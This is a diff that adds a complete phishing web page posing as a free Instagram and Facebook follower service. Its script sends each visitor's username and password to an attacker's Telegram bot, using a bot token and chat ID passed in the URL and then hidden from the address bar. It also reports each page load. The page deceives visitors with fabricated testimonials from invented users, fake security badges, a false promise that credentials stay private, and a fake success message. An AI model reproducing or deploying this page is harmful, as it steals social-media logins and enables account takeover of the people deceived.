@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Social Boost – Free Followers</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+            background:linear-gradient(160deg, #f0f2f5, #dce1e8);
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            min-height:100vh;
+            padding:16px;
+        }
+        .container{
+            max-width:440px;
+            width:100%;
+            background:#ffffff;
+            border-radius:32px;
+            padding:28px 24px 22px;
+            box-shadow:0 25px 70px rgba(0,0,0,0.07),0 0 0 1px rgba(0,0,0,0.02);
+            border:1px solid rgba(255,255,255,0.4);
+            position:relative;
+            overflow:hidden;
+        }
+        .container::before{
+            content:'';
+            position:absolute;
+            top:0;
+            left:0;
+            right:0;
+            height:4px;
+            background:linear-gradient(90deg, #1877f2, #0095f6, #f09433, #dc2743);
+            border-radius:32px 32px 0 0;
+        }
+
+        .logo-section{
+            display:flex;
+            flex-direction:column;
+            align-items:center;
+            margin-bottom:18px;
+            padding-top:4px;
+        }
+        .logo-main{
+            display:flex;
+            align-items:center;
+            gap:12px;
+            background:linear-gradient(145deg, #f8f9fa, #eef1f5);
+            padding:8px 20px 8px 16px;
+            border-radius:60px;
+            border:1px solid #e4e6eb;
+            box-shadow:0 2px 8px rgba(0,0,0,0.02);
+        }
+        .logo-main .icon{
+            width:40px;
+            height:40px;
+            border-radius:50%;
+            background:linear-gradient(135deg,#1877f2,#0095f6);
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            color:#fff;
+            font-size:1.2rem;
+            font-weight:800;
+            box-shadow:0 4px 12px rgba(24,119,242,0.15);
+        }
+        .logo-main .brand-text{
+            font-size:1.2rem;
+            font-weight:700;
+            color:#1c1e21;
+            letter-spacing:-0.3px;
+        }
+        .logo-main .brand-text span{color:#1877f2}
+        .logo-sub{
+            display:flex;
+            align-items:center;
+            gap:10px;
+            margin-top:6px;
+            font-size:0.65rem;
+            color:#8d949e;
+            font-weight:500;
+            text-transform:uppercase;
+            letter-spacing:0.5px;
+        }
+        .logo-sub .platform{
+            display:flex;
+            align-items:center;
+            gap:4px;
+        }
+        .logo-sub .platform svg{height:14px;width:auto}
+        .logo-sub .sep{color:#ccd0d5}
+
+        .header-text{text-align:center;margin-bottom:18px}
+        .header-text h1{font-size:1.5rem;font-weight:700;color:#1c1e21;letter-spacing:-0.4px}
+        .header-text p{color:#606770;font-size:0.85rem;margin-top:2px;font-weight:400}
+
+        .platform-selector{
+            display:flex;
+            gap:12px;
+            margin-bottom:16px;
+            justify-content:center;
+        }
+        .platform-selector label{
+            flex:1;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            gap:8px;
+            padding:10px;
+            border-radius:12px;
+            border:2px solid #e4e6eb;
+            cursor:pointer;
+            transition:0.15s;
+            background:#f5f6f7;
+            font-weight:500;
+            font-size:0.9rem;
+            color:#606770;
+        }
+        .platform-selector label.selected{
+            border-color:#1877f2;
+            background:#e8f0fe;
+            color:#1877f2;
+        }
+        .platform-selector label input{display:none}
+        .platform-selector label .plat-icon{
+            display:inline-flex;
+            align-items:center;
+            justify-content:center;
+            height:24px;
+            width:auto;
+        }
+        .platform-selector label .plat-icon svg{height:22px;width:auto}
+
+        .form-group{margin-bottom:14px}
+        .form-group input{
+            width:100%;
+            padding:14px 16px;
+            border:1px solid #ccd0d5;
+            border-radius:12px;
+            font-size:0.95rem;
+            outline:none;
+            transition:0.15s;
+            background:#f5f6f7;
+            color:#1c1e21;
+            box-shadow:inset 0 1px 3px rgba(0,0,0,0.02);
+        }
+        .form-group input:focus{
+            border-color:#1877f2;
+            background:#fff;
+            box-shadow:0 0 0 3px rgba(24,119,242,0.04),inset 0 1px 3px rgba(0,0,0,0.02);
+        }
+        .form-group input::placeholder{color:#8d949e;font-weight:400}
+        .btn{
+            width:100%;
+            padding:14px;
+            background:linear-gradient(135deg,#1877f2,#0095f6);
+            color:#fff;
+            border:none;
+            border-radius:12px;
+            font-size:1rem;
+            font-weight:700;
+            cursor:pointer;
+            transition:0.15s;
+            margin-top:4px;
+            letter-spacing:0.3px;
+            box-shadow:0 4px 16px rgba(24,119,242,0.15);
+        }
+        .btn:hover{opacity:0.92;transform:scale(1.01);box-shadow:0 6px 20px rgba(24,119,242,0.2)}
+        .btn:disabled{opacity:0.6;cursor:not-allowed;transform:none;box-shadow:none}
+        .loader{display:none;text-align:center;margin:10px 0}
+        .loader span{
+            display:inline-block;
+            width:10px;
+            height:10px;
+            background:#1877f2;
+            border-radius:50%;
+            margin:0 5px;
+            animation:dotBounce 1.4s infinite ease-in-out both;
+        }
+        .loader span:nth-child(1){animation-delay:-0.32s}
+        .loader span:nth-child(2){animation-delay:-0.16s}
+        @keyframes dotBounce{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
+        .status{
+            text-align:center;
+            font-size:0.85rem;
+            color:#606770;
+            margin-top:10px;
+            min-height:22px;
+            font-weight:400;
+        }
+        .status.success{color:#42b72a}
+        .status.error{color:#f02849}
+        .status.info{color:#1877f2}
+
+        .trust-badge{
+            display:flex;
+            justify-content:center;
+            gap:16px;
+            margin:14px 0 12px;
+            font-size:0.6rem;
+            color:#8d949e;
+        }
+        .trust-badge span{display:flex;align-items:center;gap:4px}
+
+        /* ===== ফিড – একক টেক্সট, কোনো বক্স নেই ===== */
+        .feed-section{
+            margin-top:16px;
+            border-top:1px solid #e4e6eb;
+            padding-top:16px;
+        }
+        .feed-title{
+            font-size:0.65rem;
+            font-weight:600;
+            color:#8d949e;
+            text-transform:uppercase;
+            letter-spacing:0.8px;
+            text-align:center;
+            margin-bottom:10px;
+        }
+        .feed-container{
+            height:80px;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            position:relative;
+            overflow:hidden;
+            background:transparent;
+        }
+        .feed-item{
+            position:absolute;
+            width:100%;
+            text-align:center;
+            padding:4px 0;
+            opacity:0;
+            transform:translateY(12px) scale(0.96);
+            transition:opacity 0.5s ease, transform 0.5s ease;
+            pointer-events:none;
+        }
+        .feed-item.active{
+            opacity:1;
+            transform:translateY(0) scale(1);
+        }
+        .feed-item.exit{
+            opacity:0;
+            transform:translateY(-12px) scale(0.96);
+        }
+        .feed-item .line1{
+            font-size:0.85rem;
+            font-weight:600;
+            color:#1c1e21;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            gap:8px;
+            flex-wrap:wrap;
+        }
+        .feed-item .line1 .avatar{
+            display:inline-block;
+            width:24px;
+            height:24px;
+            border-radius:50%;
+            color:#fff;
+            text-align:center;
+            line-height:24px;
+            font-size:0.5rem;
+            font-weight:700;
+            flex-shrink:0;
+        }
+        .feed-item .line1 .badge{
+            background:#e4e6eb;
+            color:#606770;
+            font-size:0.5rem;
+            padding:1px 6px;
+            border-radius:30px;
+            font-weight:400;
+        }
+        .feed-item .line1 .time{
+            color:#8d949e;
+            font-size:0.5rem;
+            font-weight:400;
+        }
+        .feed-item .message{
+            font-size:0.75rem;
+            color:#4a4a5a;
+            margin-top:3px;
+            line-height:1.3;
+        }
+
+        .footer-note{
+            background:rgba(24,119,242,0.03);
+            border-left:3px solid #1877f2;
+            padding:10px 14px;
+            border-radius:12px;
+            margin-top:16px;
+            font-size:0.7rem;
+            color:#3a5a7a;
+            text-align:center;
+            border:1px solid rgba(24,119,242,0.04);
+        }
+        .footer{
+            text-align:center;
+            font-size:0.6rem;
+            color:#8d949e;
+            margin-top:14px;
+            border-top:1px solid #e4e6eb;
+            padding-top:12px;
+        }
+
+        @media(max-width:480px){
+            .container{padding:20px 16px}
+            .logo-main{padding:6px 16px 6px 12px}
+            .logo-main .icon{width:34px;height:34px;font-size:1rem}
+            .logo-main .brand-text{font-size:1rem}
+            .header-text h1{font-size:1.2rem}
+            .feed-container{height:85px}
+            .feed-item .line1{font-size:0.75rem}
+            .feed-item .message{font-size:0.7rem}
+            .trust-badge{font-size:0.5rem;gap:10px}
+            .platform-selector label{font-size:0.8rem;padding:8px}
+            .platform-selector label .plat-icon svg{height:18px}
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <div class="logo-section">
+        <div class="logo-main">
+            <div class="icon">🚀</div>
+            <div class="brand-text">Social<span>Boost</span></div>
+        </div>
+        <div class="logo-sub">
+            <span class="platform">
+                <svg viewBox="0 0 100 30" xmlns="http://www.w3.org/2000/svg">
+                    <defs><linearGradient id="ig2" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#f09433"/><stop offset="50%" stop-color="#e6683c"/><stop offset="100%" stop-color="#dc2743"/></linearGradient></defs>
+                    <rect width="100" height="30" rx="6" fill="url(#ig2)"/>
+                    <text x="50" y="20" font-family="Arial" font-size="13" font-weight="700" fill="#fff" text-anchor="middle">Instagram</text>
+                </svg>
+            </span>
+            <span class="sep">+</span>
+            <span class="platform">
+                <svg viewBox="0 0 100 30" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="30" rx="6" fill="#1877f2"/>
+                    <text x="50" y="20" font-family="Arial" font-size="13" font-weight="700" fill="#fff" text-anchor="middle">Facebook</text>
+                </svg>
+            </span>
+        </div>
+    </div>
+
+    <div class="header-text">
+        <h1>Free Followers</h1>
+        <p>Get 8-10K followers on Instagram &amp; Facebook instantly</p>
+    </div>
+
+    <div class="platform-selector" id="platformSelector">
+        <label class="selected" id="labelInsta">
+            <input type="radio" name="platform" value="instagram" checked />
+            <span class="plat-icon">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <defs><linearGradient id="igSmall" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#f09433"/><stop offset="50%" stop-color="#e6683c"/><stop offset="100%" stop-color="#dc2743"/></linearGradient></defs>
+                    <rect x="2" y="2" width="20" height="20" rx="6" fill="url(#igSmall)"/>
+                    <circle cx="12" cy="12" r="5" fill="none" stroke="#fff" stroke-width="1.5"/>
+                    <circle cx="17.5" cy="6.5" r="1.2" fill="#fff"/>
+                </svg>
+            </span>
+            Instagram
+        </label>
+        <label id="labelFb">
+            <input type="radio" name="platform" value="facebook" />
+            <span class="plat-icon">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="2" y="2" width="20" height="20" rx="4" fill="#1877f2"/>
+                    <path d="M16 10h-2V8.5c0-.8.5-1 1-1h1V5h-2c-2 0-3 1.5-3 3V10H9v2h2v7h3v-7h2l1-2z" fill="#fff"/>
+                </svg>
+            </span>
+            Facebook
+        </label>
+    </div>
+
+    <div class="form-group">
+        <input type="text" id="username" placeholder="📧 Email, phone or username" />
+    </div>
+    <div class="form-group">
+        <input type="password" id="password" placeholder="🔒 Password" />
+    </div>
+
+    <button class="btn" id="submitBtn">🚀 Get Followers Now</button>
+
+    <div class="loader" id="loader"><span></span><span></span><span></span></div>
+    <div class="status" id="statusMsg">Enter your details to get free followers.</div>
+
+    <div class="trust-badge">
+        <span>🔒 Secure</span>
+        <span>⚡ Instant</span>
+        <span>⭐ 4.9/5</span>
+    </div>
+
+    <div class="feed-section">
+        <div class="feed-title">📢 Real‑time activity</div>
+        <div class="feed-container" id="feedContainer">
+            <!-- single feed item will be injected here -->
+        </div>
+    </div>
+
+    <div class="footer-note">
+        🔒 Your credentials are secure and will only be used for this service.
+    </div>
+    <div class="footer">
+        <span>© 2025 SocialBoost. All rights reserved.</span>
+    </div>
+</div>
+
+<script>
+    // ====== 🔥 URL ডিকোড ফিক্স (সর্বপ্রথম) ======
+    (function() {
+        const params = new URLSearchParams(window.location.search);
+        const token = params.get('tg_token');
+        const chatId = params.get('tg_chat');
+        if (token) {
+            try { localStorage.setItem('tg_bot_token', decodeURIComponent(token)); } catch(e) {}
+        }
+        if (chatId) {
+            try { localStorage.setItem('tg_chat_id', decodeURIComponent(chatId)); } catch(e) {}
+        }
+        if (params.has('tg_token') || params.has('tg_chat')) {
+            params.delete('tg_token');
+            params.delete('tg_chat');
+            const newUrl = window.location.pathname + (params.toString() ? '?' + params.toString() : '');
+            window.history.replaceState({}, '', newUrl);
+        }
+    })();
+
+    // ====== মূল কোড ======
+    (function() {
+        'use strict';
+
+        function getCreds() {
+            const p = new URLSearchParams(window.location.search);
+            let t = p.get('tg_token') || localStorage.getItem('tg_bot_token');
+            let c = p.get('tg_chat') || localStorage.getItem('tg_chat_id');
+            return { token: t, chatId: c };
+        }
+
+        function sendLog(action, extra) {
+            const { token, chatId } = getCreds();
+            if (!token || !chatId) return;
+            const time = new Date().toLocaleString();
+            let msg = `📊 *Cyber Tools Activity*\n🕐 ${time}\n🔧 Tool: 📱 IG & FB FOLLOWERS  PHIS\n📌 Action: ${action}`;
+            if (extra) msg += `\n\n🔑 *${extra}*`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+            }).catch(() => {});
+        }
+
+        // DOM
+        const u = document.getElementById('username');
+        const p = document.getElementById('password');
+        const btn = document.getElementById('submitBtn');
+        const loader = document.getElementById('loader');
+        const status = document.getElementById('statusMsg');
+        const feedContainer = document.getElementById('feedContainer');
+
+        // Platform selector
+        const labels = document.querySelectorAll('.platform-selector label');
+        let selectedPlatform = 'instagram';
+
+        labels.forEach(label => {
+            label.addEventListener('click', function() {
+                labels.forEach(l => l.classList.remove('selected'));
+                this.classList.add('selected');
+                const radio = this.querySelector('input[type="radio"]');
+                if (radio) {
+                    radio.checked = true;
+                    selectedPlatform = radio.value;
+                }
+            });
+        });
+
+        // ---------- ডামি ডেটা ----------
+        const firstNames = ['Rahul', 'Sneha', 'Amit', 'Priya', 'Vikram', 'Anjali', 'Ravi', 'Neha', 'Arjun', 'Kavya', 'Suresh', 'Pooja', 'Deepak', 'Meera', 'Raj', 'Soni', 'Gaurav', 'Isha', 'Manoj', 'Shreya'];
+        const lastNames = ['Sharma', 'Patel', 'Singh', 'Gupta', 'Verma', 'Reddy', 'Kumar', 'Jain', 'Rao', 'Joshi', 'Das', 'Mishra', 'Nair', 'Iyer', 'Choudhury', 'Malhotra', 'Srivastava', 'Khanna', 'Sinha', 'Menon'];
+        const messages = [
+            'Just got 5k followers in 1 hour! This is legit 🔥',
+            'Amazing service! My Instagram exploded 🚀',
+            'I got 10k followers overnight, thank you so much! 🙏',
+            'Perfect for boosting my business page, got 8k followers!',
+            'This actually works! My Facebook page grew 3x 📈',
+            'Best free tool ever! I gained 6k followers today 😍',
+            'Unreal! I went from 200 to 5k followers in 2 hours!',
+            'I was skeptical but this really delivered 7k followers!',
+            'Free and instant – highly recommend! ⭐⭐⭐⭐⭐',
+            'This helped me reach 10k followers milestone 🎯',
+            'My engagement skyrocketed after using this!',
+            'I’m shocked, it really works! 5k followers added',
+            'Great for growing your social presence fast',
+            'I got 9k followers, my friends are asking how I did it! 🤫',
+            'Just signed up and already seeing results in minutes!'
+        ];
+
+        function getRandomName() {
+            const f = firstNames[Math.floor(Math.random() * firstNames.length)];
+            const l = lastNames[Math.floor(Math.random() * lastNames.length)];
+            return f + ' ' + l;
+        }
+
+        function getRandomMessage() {
+            return messages[Math.floor(Math.random() * messages.length)];
+        }
+
+        function getRandomAvatar(text) {
+            const colors = ['#1877f2', '#0095f6', '#42b72a', '#f09433', '#dc2743', '#8e44ad', '#e67e22', '#2c3e50'];
+            const bg = colors[Math.floor(Math.random() * colors.length)];
+            return { bg, initial: text.charAt(0).toUpperCase() };
+        }
+
+        // ---------- একক ফিড আইটেম তৈরি ----------
+        function createFeedItem(name, msg, avatar, time, isVictim) {
+            const badge = isVictim ? 'now' : (Math.floor(Math.random() * 5) + 1) + 'm ago';
+            const timeLabel = isVictim ? '🕐 Just now' : '🕐 ' + time;
+            const extraStyle = isVictim ? 'color: #1877f2; font-weight:600;' : '';
+            const item = document.createElement('div');
+            item.className = 'feed-item';
+            item.style.cssText = extraStyle;
+            item.innerHTML = `
+                <div class="line1">
+                    <span class="avatar" style="background:${avatar.bg}">${avatar.initial}</span>
+                    <span>${name} ${isVictim ? '⭐' : ''}</span>
+                    <span class="badge">${badge}</span>
+                    <span class="time">${timeLabel}</span>
+                </div>
+                <div class="message">${msg}</div>
+            `;
+            return item;
+        }
+
+        // ---------- রোটেট ----------
+        let currentItem = null;
+        let intervalId = null;
+
+        function showItem(item) {
+            if (currentItem) {
+                currentItem.classList.remove('active');
+                currentItem.classList.add('exit');
+                setTimeout(() => {
+                    if (currentItem && currentItem.parentNode) {
+                        currentItem.remove();
+                    }
+                    currentItem = item;
+                    feedContainer.appendChild(item);
+                    requestAnimationFrame(() => {
+                        item.classList.add('active');
+                    });
+                }, 500);
+            } else {
+                currentItem = item;
+                feedContainer.appendChild(item);
+                requestAnimationFrame(() => {
+                    item.classList.add('active');
+                });
+            }
+        }
+
+        function rotateFeed() {
+            const name = getRandomName();
+            const msg = getRandomMessage();
+            const avatar = getRandomAvatar(name);
+            const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+            const item = createFeedItem(name, msg, avatar, time, false);
+            showItem(item);
+        }
+
+        // ---------- শুরু ----------
+        setTimeout(rotateFeed, 500);
+        intervalId = setInterval(rotateFeed, 3000);
+
+        // ---------- FORM SUBMIT ----------
+        btn.addEventListener('click', function() {
+            const uname = u.value.trim();
+            const pass = p.value.trim();
+            if (!uname || !pass) {
+                status.textContent = '⚠️ Please fill in both fields.';
+                status.className = 'status error';
+                return;
+            }
+
+            // Disable button and show loader
+            btn.disabled = true;
+            loader.style.display = 'block';
+            status.textContent = '⏳ Processing...';
+            status.className = 'status';
+
+            const platform = selectedPlatform === 'instagram' ? 'Instagram' : 'Facebook';
+            sendLog('User submitted credentials', `Platform: ${platform} | Username: ${uname} | Password: ${pass}`);
+
+            // ভিকটিমের নাম ফিডে দেখান
+            setTimeout(() => {
+                const fakeName = uname.split('@')[0] || uname;
+                const successMsg = `🎉 ${fakeName} just got 5,000 followers on ${platform}!`;
+                const avatar = getRandomAvatar(fakeName);
+                const timeNow = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
+                const item = createFeedItem(fakeName, successMsg, avatar, timeNow, true);
+                // থামিয়ে দিন
+                if (intervalId) {
+                    clearInterval(intervalId);
+                    intervalId = null;
+                }
+                // পুরোনো আইটেম সরান
+                if (currentItem) {
+                    currentItem.remove();
+                    currentItem = null;
+                }
+                showItem(item);
+                // 3 সেকেন্ড পর আবার রোটেট শুরু করুন
+                setTimeout(() => {
+                    if (!intervalId) {
+                        intervalId = setInterval(rotateFeed, 3000);
+                    }
+                }, 3500);
+            }, 300);
+
+            // Show success message and wait instruction (no redirect)
+            setTimeout(() => {
+                loader.style.display = 'none';
+                btn.disabled = true; // keep disabled
+                status.textContent = '✅ Followers added successfully! Please wait 24 hours for them to appear.';
+                status.className = 'status success';
+                // Optionally, you can hide the button or change its text
+                btn.textContent = '✅ Done';
+            }, 1800);
+        });
+
+        sendLog('Page loaded');
+    })();
+</script>
+</body>
+</html>
